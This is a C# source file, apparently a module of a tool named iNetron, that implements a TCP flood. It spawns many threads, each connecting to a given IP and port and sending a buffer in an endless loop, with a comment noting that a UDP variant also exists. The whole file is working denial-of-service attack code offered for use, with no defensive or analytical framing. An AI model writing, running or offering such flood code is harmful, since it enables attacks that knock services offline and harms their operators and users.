using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace iNetron.Core.Methods.Vol
{
    /// <summary>
    /// Same as UDP but TCP instead. Note this one isn't as reliable because TCP is based on ACK's.
    /// </summary>
    public class tcp
    {
        private class sock
        {
            private Socket sk;
            private IPEndPoint ipe;
            private byte[] buf;

            public sock(string ip, int port, int size)
            {
                ipe = new IPEndPoint(IPAddress.Parse(ip), port);
                sk = new Socket(SocketType.Stream, ProtocolType.Tcp);

                buf = new byte[size];
            }

            // Sending a 'huge' buffer to the target.
            public void flood()
            {
                while (true)
                {
                    try { if (!sk.Connected) { do { sk.Connect(ipe); } while (!sk.Connected); } sk.Send(buf);  }
                    catch { Console.Error.WriteLine("TCP Flood Send Fail"); }
                }
            }
        }

        private string p_ip;
        private int p_port;
        private int p_sz;
        private int p_threads;
        public tcp(string ip, int port, int size, int threads)
        {
            p_ip = ip;
            p_port = port;
            p_sz = size;
            p_threads = threads;
        }
        public void floodNow()
        {
            for (int i = 0; i < p_threads; ++i)
            {
                sock tsock = new sock(p_ip, p_port, p_sz);
                new Thread(tsock.flood).Start();
            }
        }
    }
}